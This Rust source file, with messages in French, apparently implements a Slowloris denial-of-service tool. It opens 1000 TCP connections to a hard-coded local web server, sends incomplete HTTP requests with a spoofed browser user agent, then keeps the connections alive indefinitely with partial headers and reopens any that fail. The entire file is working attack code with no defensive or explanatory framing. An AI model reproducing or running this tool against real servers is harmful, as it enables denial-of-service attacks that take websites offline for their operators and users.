use std::io::Write;
use std::net::{IpAddr, Ipv4Addr, SocketAddr, TcpStream};
use rand::random;

struct Socket {
    ip: IpAddr,
    port: u16,
}

impl Socket {
    pub fn create(&self, nb_sockets: usize) -> Vec<TcpStream> {
        let mut sockets = vec![];
        for _i in 0..nb_sockets {
            sockets.push(Socket::new_instance(&self));
        }
        sockets
    }

    pub fn new_instance(&self) -> TcpStream {
        let mut s = TcpStream::connect(SocketAddr::new(self.ip, self.port))
            .expect("Impossible de se connecter");
        s.write_all(
            format!(
                "GET /?{} HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: {}\r\nConnection: keep-alive\r\n",
                random::<i8>(),
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"
            ).as_bytes(),
        ).expect("Impossible d'envoyer les informations");
        s
    }
}

fn main () {

    let  nb_sockets: usize = 1000;

    println!("Création des sockets...");

    let instance = Socket {
        ip: IpAddr::V4(Ipv4Addr::new(192, 168, 1, 14)),
        port: 80
    };

    let mut sockets: Vec<TcpStream> = instance.create(nb_sockets);

    println!("Début de l'attaque Slowloris...");
    loop {
        for socket in &mut sockets {
            match socket.write_all(format!("X-a: {}\r\n", random::<i8>()).as_bytes()) {
                Ok(_) => println!("Réussi !"),
                Err(_) => {
                    println!("Erreur : {:?}", socket);
                    *socket = instance.new_instance();
                },
            };
        }
    }
}